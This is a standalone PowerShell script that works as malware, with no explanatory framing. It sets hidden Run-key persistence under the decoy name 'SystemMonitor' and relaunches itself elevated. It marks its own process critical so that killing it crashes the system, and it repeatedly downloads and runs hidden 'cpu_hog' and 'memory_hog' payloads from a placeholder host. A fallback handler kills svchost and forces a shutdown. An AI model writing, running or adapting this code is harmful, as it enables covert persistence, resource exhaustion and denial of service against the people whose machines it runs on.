# Self-elevation and persistence setup
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $scriptPath = "$env:temp\root.ps1"
    Set-ItemProperty -Path $registryPath -Name "SystemMonitor" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
    Start-Process powershell.exe -ArgumentList "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", "$scriptPath" -Verb RunAs
    exit
}

# Critical process elevation
$signature = @'
[DllImport("ntdll.dll")]
public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
'@
Add-Type -Name "CriticalProcess" -Namespace "WinAPI" -MemberDefinition $signature -Language CSharp -PassThru
[WinAPI.CriticalProcess]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

# File monitoring configuration
$targetFiles = @{
    cpu_hog = "https://your-domain.com/cpu_hog.txt"
    memory_hog = "https://your-domain.com/memory_hog.txt"
}
$downloadPath = "$env:temp\"
$checkInterval = 60 # Seconds

# Download and execute logic
function Update-Files {
    foreach ($file in $targetFiles.GetEnumerator()) {
        $localPath = Join-Path $downloadPath $file.Key
        if (-not (Test-Path $localPath)) {
            Invoke-WebRequest -Uri $file.Value -OutFile $localPath -UseBasicParsing
            Write-Host "Downloaded $($file.Key) to $localPath"
        }
        Start-Process powershell.exe -ArgumentList "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", $localPath
    }
}

# Process monitoring and crash handler
Register-ObjectEvent -InputObject (New-Object System.Timers.Timer) -EventName Elapsed -SourceIdentifier FileMonitor -Action {
    $process = Get-Process -Name (Get-Process -Id $PID).ProcessName -ErrorAction SilentlyContinue
    if (-not $process) {
        Write-Host "Critical process terminated - initiating system crash"
        Start-Process cmd.exe -ArgumentList "/c", "taskkill /im svchost.exe /f" -WindowStyle Hidden
        Start-Process wmic.exe -ArgumentList "computersystem", "where", "name='%computername%'", "call", "shutdown", "/s/f/t", "0" -WindowStyle Hidden
    }
} | Out-Null

# Initial file setup and monitoring loop
Update-Files
while ($true) {
    Update-Files
    Start-Sleep -Seconds $checkInterval
}
